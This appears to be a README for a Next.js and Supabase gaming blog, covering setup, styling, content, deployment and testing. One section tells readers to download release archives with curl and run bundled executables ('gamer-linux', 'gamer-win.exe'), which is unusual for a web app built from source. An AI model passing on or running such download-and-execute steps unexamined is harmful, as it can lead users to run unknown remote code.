Getting started

Prerequisites
- Node.js 18+ or the LTS version recommended by Next.js.
- npm, yarn, or pnpm to manage packages.
- A Supabase project (for full site features).
- Git to clone the repository.

Clone and install
1. Clone the repository:
```bash
git clone https://github.com/AtoLtoEXANDER/Gamer.git
cd Gamer
```

2. Install dependencies with your package manager:
```bash
# npm
npm ci

# yarn
yarn install

# pnpm
pnpm install
```

3. Copy example env file and update values:
```bash
cp .env.example .env.local
```
Open .env.local and set:
- NEXT_PUBLIC_SUPABASE_URL
- NEXT_PUBLIC_SUPABASE_ANON_KEY
- NEXT_PUBLIC_SITE_URL
- NEXT_PUBLIC_GOOGLE_ANALYTICS (optional)
- Any other keys used by the app

Run the site (development)
Start the dev server:
```bash
npm run dev
# or
yarn dev
# or
pnpm dev
```
Open http://localhost:3000 to preview. The site supports hot reload. Edit components, pages, and styles and refresh to see changes.

Build and run production
1. Build:
```bash
npm run build
```
2. Start production server:
```bash
npm run start
```
The production server runs the optimized Next.js build. For static export use next export if configured.

Releases and executable assets
This repository posts packaged releases. Download the release package and execute the included file or start script to run the packaged version locally or on a server. The releases page contains build artifacts and installer-like bundles.

- Visit the releases page or use the badge above:
  https://github.com/AtoLtoEXANDER/Gamer/releases

If the releases page contains an archive (.zip or .tar.gz), use these steps:

Linux / macOS (tar.gz)
```bash
curl -L -o gamer-release.tar.gz "https://github.com/AtoLtoEXANDER/Gamer/releases/download/v1.0/gamer-v1.0.tar.gz"
tar -xzf gamer-release.tar.gz
cd gamer-v1.0
# if the release contains a node app
npm ci
npm run start
# or execute a binary, for example:
chmod +x gamer-linux
./gamer-linux
```

Windows (.zip)
1. Download gamer-v1.0.zip from the releases page.
2. Extract the archive.
3. Open PowerShell in the extracted folder and run:
```powershell
npm ci
npm run start
# or
.\gamer-win.exe
```

If the release has a single executable, mark it executable (Unix) and run it. If the release bundles a Docker image or docker-compose file, run the provided Docker commands. If the release link fails or the page does not show clear assets, check the Releases section inside the repository on GitHub.

If the link does not work for you, check the Releases tab on GitHub for the latest assets:
https://github.com/AtoLtoEXANDER/Gamer/releases

Data and CMS: Supabase setup
The site uses Supabase for data and file storage. The repo ships with a lib/supabase client and simple schema SQL you can import.

Supabase setup steps
1. Create a Supabase project at https://app.supabase.com.
2. Create a table for posts:
- id (uuid, primary key, default gen_random_uuid())
- title (text)
- slug (text, unique)
- content (text)
- excerpt (text)
- published (boolean)
- published_at (timestamp)
- tags (text[] or jsonb)
- author_id (uuid)
- cover_url (text)
- created_at (timestamp with timezone)
3. Create a table for authors:
- id (uuid, primary key)
- name (text)
- bio (text)
- avatar_url (text)
- created_at
4. Create policies for public read on posts and specific insert/update only for authenticated users or service role.
5. Enable Storage for images and set a public bucket for covers and media.

Supabase client configuration
Place Supabase keys in .env.local:
```
NEXT_PUBLIC_SUPABASE_URL=https://xyz.supabase.co
NEXT_PUBLIC_SUPABASE_ANON_KEY=public-anon-key
SUPABASE_SERVICE_ROLE_KEY=your-service-role-key
```
Use the public key on the client. Use the service role key on server-only functions or server components that require elevated access.

Markdown and MDX
- The site uses MDX to allow inline React components inside posts.
- Use frontmatter for post metadata (title, date, tags, cover).
- The build process converts MDX to static props or server-rendered content.

Styling: Tailwind CSS and theming
Tailwind drives the design. The repo uses a theme file with custom colors and tokens to create a game-like look: neon, HUD panels, scanlines, and a pixel font fallback.

Key Tailwind items
- tailwind.config.js contains custom colors like neon-blue, neon-pink, gray-hud, and a dark background.
- Utility classes manage spacing, responsive behavior, and typography.
- CSS variables live in :root to support dynamic theme toggles.

Dark mode
- The site uses class-based dark mode. The header includes a toggle that updates local storage and adds the .dark class to html.
- Tailwind config uses darkMode: 'class'.

Fonts and pixel look
- Use a pixel font for headings (e.g., Press Start 2P) and a clean sans for body copy.
- Load fonts via Google Fonts or a local font in /public/fonts.

Animations and micro-interactions
- Use small CSS transforms and transitions for buttons and links.
- Use a subtle neon glow on active elements.
- Use CSS sprite or SVG for HUD icons.

Content: Posts, pages, and media
Post format
- Use MDX with frontmatter:
```md
---
title: "How I Tuned an Emulator"
date: "2024-06-10"
tags: ["emulation", "retro", "setup"]
excerpt: "A short guide on emulator performance and shaders."
cover: "/posts/emulator-cover.png"
---
```
- Export a default function or plain MDX content.

Media handling
- Place images in the public folder or in Supabase Storage.
- Serve images with next/image for optimization and lazy loading.
- For user uploads, use Supabase Storage signed URLs.

Authoring workflow
- Create posts locally and push to Git, or use a simple admin UI tied to Supabase to create posts that the site pulls at runtime.
- For a git-based workflow, the repo supports static generation and commit-based publishing.

Routing and SEO
Routing
- Use file-based routing in Next.js: pages/posts/[slug].tsx or app/posts/[slug]/page.tsx.
- Add catch-all routes for nested content if needed.

SEO
- Each page sets metadata: title, description, canonical link, and open graph tags.
- Use structured data (JSON-LD) for articles to improve SERP display.
- Provide an RSS feed at /rss.xml generated at build time.

Sitemap
- Generate sitemap.xml at build and serve it from the public folder or an API route that regenerates.

Asset management and optimization
Images
- Use next/image to optimize sizes.
- Provide an image loader or use Next.js built-in loader if deployed to Vercel.

Fonts
- Use font-display: swap to avoid layout shifts.

Code blocks
- Use Prism or Shiki for server-side highlighting to avoid runtime hits.
- Compress large vendor libraries and use dynamic imports where appropriate.

Accessibility and performance
Accessibility
- Maintain semantic HTML: headings, landmarks, and native controls.
- Add ARIA attributes where native tags cannot convey intent.
- Ensure color contrast in neon themes by tuning background and glow layers.
- Support keyboard navigation for interactive elements.

Performance
- Use server-side rendering or incremental static regeneration for posts.
- Avoid heavy client-side JS on landing pages.
- Use caching headers and image optimization.
- Run Lighthouse audits and act on flagged issues.

Deployment
Deploy to Vercel for a seamless Next.js experience. You can also deploy to Netlify or other hosts as long as Next.js server support exists.

Vercel
- Connect the repo to Vercel.
- Add environment variables in the Vercel dashboard: NEXT_PUBLIC_SUPABASE_URL, NEXT_PUBLIC_SUPABASE_ANON_KEY, etc.
- Set build command: npm run build
- Set output directory per Next.js defaults.

Docker (optional)
Example Dockerfile to run a Node server:
```dockerfile
FROM node:18-alpine AS deps
WORKDIR /app
COPY package.json package-lock.json ./
RUN npm ci --production

FROM node:18-alpine AS builder
WORKDIR /app
COPY . .
RUN npm ci
RUN npm run build

FROM node:18-alpine AS runner
WORKDIR /app
ENV NODE_ENV=production
COPY --from=builder /app/.next ./.next
COPY --from=builder /app/public ./public
COPY --from=builder /app/node_modules ./node_modules
COPY --from=builder /app/package.json ./package.json
CMD ["node", "server.js"]
```
Adjust the Dockerfile to your hosting model. If you build a static export, serve it with a lightweight static server.

CI / CD suggestions
- Use GitHub Actions to run tests, lint, and deploy.
- Basic workflow:
  - On push to main: run tests, run build, and deploy to Vercel or build and publish a Docker image to a registry.
- Example jobs:
  - lint: static analysis with ESLint and Stylelint.
  - test: unit tests with Jest or Vitest.
  - build: Next.js build and artifact upload.
  - release: create a GitHub release and attach build artifacts.

Testing and QA
Unit tests
- Test components with Jest and React Testing Library.
- Mock Supabase client with a local stub or msw.

Integration tests
- Use Playwright or Cypress for end-to-end tests.
- Test routing, form submissions, and editor flows.
